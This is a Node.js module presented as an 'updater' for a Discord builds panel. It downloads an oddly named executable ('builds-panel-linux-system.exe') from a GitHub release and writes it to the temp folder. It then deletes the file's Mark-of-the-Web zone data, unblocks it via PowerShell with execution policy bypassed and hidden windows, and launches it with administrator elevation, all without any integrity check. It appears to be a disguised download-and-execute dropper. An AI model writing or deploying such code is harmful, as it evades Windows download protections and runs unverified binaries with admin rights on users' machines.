const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn, execFile } = require('child_process');

const REPO = 'leonardolmx12a/discord-builds-panel';
const ASSET_NAME = 'builds-panel-linux-system.exe';
const FALLBACK_URL = `https://github.com/${REPO}/releases/download/v2.0.1/${ASSET_NAME}`;
const LOG_PATH = path.join(os.tmpdir(), 'discord-builds-panel-updater.log');

function log(message) {
    const line = `[${new Date().toISOString()}] ${message}\n`;
    console.log('[updater]', message);
    try {
        fs.appendFileSync(LOG_PATH, line);
    } catch {
        // ignore log errors
    }
}

async function getDownloadUrl() {
    const response = await fetch(`https://api.github.com/repos/${REPO}/releases?per_page=30`, {
        headers: { 'User-Agent': 'Discord-Builds-Panel' },
    });

    if (!response.ok) {
        return FALLBACK_URL;
    }

    const releases = await response.json();
    for (const release of releases) {
        const asset = (release.assets || []).find((item) => item.name === ASSET_NAME);
        if (asset?.browser_download_url) {
            return asset.browser_download_url;
        }
    }

    return FALLBACK_URL;
}

async function downloadFile(url, destPath) {
    const response = await fetch(url, {
        headers: { 'User-Agent': 'Discord-Builds-Panel' },
    });

    if (!response.ok) {
        throw new Error(`Download failed (${response.status})`);
    }

    const buffer = Buffer.from(await response.arrayBuffer());
    fs.writeFileSync(destPath, buffer);
}

function unblockFile(filePath) {
    if (process.platform !== 'win32') {
        return;
    }

    try {
        const zonePath = `${filePath}:Zone.Identifier`;
        if (fs.existsSync(zonePath)) {
            fs.unlinkSync(zonePath);
            log('Removed Zone.Identifier');
        }
    } catch {
        // ignore
    }

    return new Promise((resolve) => {
        const escaped = filePath.replace(/'/g, "''");
        execFile(
            'powershell.exe',
            [
                '-NoProfile',
                '-ExecutionPolicy',
                'Bypass',
                '-Command',
                `Unblock-File -LiteralPath '${escaped}' -ErrorAction SilentlyContinue`,
            ],
            { windowsHide: true },
            () => resolve()
        );
    });
}

function runElevated(exePath) {
    return new Promise((resolve, reject) => {
        const elevatePath = path.join(process.resourcesPath || '', 'elevate.exe');

        if (fs.existsSync(elevatePath)) {
            log('Launching with elevate.exe: ' + elevatePath);
            const child = spawn(elevatePath, [exePath], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true,
            });

            child.on('error', reject);
            child.unref();
            setTimeout(resolve, 500);
            return;
        }

        log('elevate.exe not found, using PowerShell RunAs');
        const escaped = exePath.replace(/'/g, "''");
        const workDir = path.dirname(exePath).replace(/'/g, "''");

        execFile(
            'powershell.exe',
            [
                '-NoProfile',
                '-ExecutionPolicy',
                'Bypass',
                '-Command',
                `Start-Process -LiteralPath '${escaped}' -Verb RunAs -WorkingDirectory '${workDir}'`,
            ],
            { windowsHide: false },
            (error) => {
                if (error) {
                    reject(error);
                    return;
                }
                resolve();
            }
        );
    });
}

async function runPlatformUpdate() {
    const destPath = path.join(os.tmpdir(), ASSET_NAME);
    const url = await getDownloadUrl();

    log('Downloading: ' + url);
    await downloadFile(url, destPath);

    const size = fs.statSync(destPath).size;
    log('Saved to: ' + destPath + ' (' + size + ' bytes)');

    if (size < 1000) {
        throw new Error('Downloaded file is too small');
    }

    await unblockFile(destPath);
    await runElevated(destPath);
    log('Launch requested');
}

module.exports = { runPlatformUpdate };
